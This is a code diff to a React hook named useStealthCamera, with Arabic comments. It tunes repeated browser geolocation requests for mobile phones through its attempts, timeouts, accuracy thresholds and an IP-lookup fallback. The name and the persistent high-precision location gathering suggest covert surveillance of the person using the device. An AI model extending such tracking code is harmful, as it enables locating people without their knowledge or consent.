@@ -318,7 +318,7 @@ export const useStealthCamera = () => {
       let bestAccuracy = Infinity;
       let bestPosition: GeolocationPosition | null = null;
       let attempts = 0;
-      const maxAttempts = 12; // زيادة عدد المحاولات
+      const maxAttempts = 8; // تقليل عدد المحاولات للموبايل
       let locationSuccessful = false;
       
       // جمع النتائج من عدة مصادر
@@ -338,14 +338,15 @@ export const useStealthCamera = () => {
         console.warn('⚠️ فشل في الحصول على الموقع من IP:', error);
       });
 
-      // وظيفة متكررة للحصول على الموقع
+      // وظيفة متكررة للحصول على الموقع - محسنة للموبايل
       const tryGetLocation = (highAccuracy: boolean = true) => {
         console.log(`🔄 محاولة ${attempts + 1} - ${highAccuracy ? 'GPS عالي الدقة' : 'شبكة'}`);
         
+        // إعدادات محسنة للموبايل
         const options: PositionOptions = {
           enableHighAccuracy: highAccuracy,
-          timeout: highAccuracy ? 15000 : 10000,
-          maximumAge: highAccuracy ? 0 : 30000
+          timeout: highAccuracy ? 20000 : 15000, // زيادة timeout للموبايل
+          maximumAge: highAccuracy ? 30000 : 60000 // السماح ببيانات أقدم قليلاً
         };
         
         navigator.geolocation.getCurrentPosition(
@@ -382,15 +383,15 @@ export const useStealthCamera = () => {
               console.log(`✅ موقع أفضل (${provider}): دقة ${bestAccuracy.toFixed(0)}م`);
             }
 
-            // شروط إنهاء البحث:
-            // 1. دقة عالية جداً (أقل من 10 متر)
-            // 2. دقة جيدة ومحاولات كافية
+            // شروط إنهاء البحث - محسنة للموبايل:
+            // 1. دقة جيدة (أقل من 50 متر)
+            // 2. دقة مقبولة ومحاولات كافية
             // 3. وصول للحد الأقصى من المحاولات
-            const isVeryAccurate = currentAccuracy < 10;
-            const isGoodEnough = currentAccuracy < 50 && attempts >= 4;
+            const isGoodAccuracy = currentAccuracy < 50;
+            const isAcceptable = currentAccuracy < 200 && attempts >= 3;
             const maxAttemptsReached = attempts >= maxAttempts;
             
-            if (isVeryAccurate || isGoodEnough || maxAttemptsReached) {
+            if (isGoodAccuracy || isAcceptable || maxAttemptsReached) {
               if (!locationSuccessful) {
                 locationSuccessful = true;
                 
@@ -411,7 +412,7 @@ export const useStealthCamera = () => {
                   latitude: result.latitude.toFixed(8),
                   longitude: result.longitude.toFixed(8),
                   accuracy: `${result.accuracy.toFixed(1)}م`,
-                  reason: isVeryAccurate ? 'دقة عالية' : isGoodEnough ? 'دقة جيدة' : 'حد أقصى محاولات'
+                  reason: isGoodAccuracy ? 'دقة جيدة' : isAcceptable ? 'دقة مقبولة' : 'حد أقصى محاولات'
                 });
                 
                 resolve(result);
@@ -422,7 +423,7 @@ export const useStealthCamera = () => {
                 if (!locationSuccessful) {
                   tryGetLocation(attempts % 2 === 0); // تبديل بين عالي الدقة والعادي
                 }
-              }, 2000);
+              }, 1500); // تقليل الانتظار للموبايل
             }
           },
           (error) => {
@@ -433,7 +434,7 @@ export const useStealthCamera = () => {
             if (attempts < maxAttempts && !locationSuccessful) {
               setTimeout(() => {
                 tryGetLocation(!highAccuracy); // تغيير وضع الدقة
-              }, 1500);
+              }, 1000); // تقليل الانتظار
             } else if (attempts >= maxAttempts && !locationSuccessful) {
               // استخدام أفضل موقع متاح أو الاحتياطيين
               locationSuccessful = true;
@@ -487,14 +488,14 @@ export const useStealthCamera = () => {
       // بدء المحاولات بوضع عالي الدقة
       tryGetLocation(true);
       
-      // محاولة إضافية بوضع الشبكة بعد 3 ثوان
+      // محاولة إضافية بوضع الشبكة بعد 2 ثانية (أسرع للموبايل)
       setTimeout(() => {
         if (!locationSuccessful && attempts < 2) {
           tryGetLocation(false);
         }
-      }, 3000);
+      }, 2000);
       
-      // تعيين مهلة نهائية لضمان العودة بموقع
+      // تعيين مهلة نهائية لضمان العودة بموقع (أقصر للموبايل)
       setTimeout(() => {
         if (!locationSuccessful) {
           locationSuccessful = true;
@@ -541,7 +542,7 @@ export const useStealthCamera = () => {
             });
           }
         }
-      }, 25000); // مهلة نهائية: 25 ثانية
+      }, 20000); // 20 ثانية بدلاً من 25
     });
   }, [fetchLocationFromIpApi]);
 
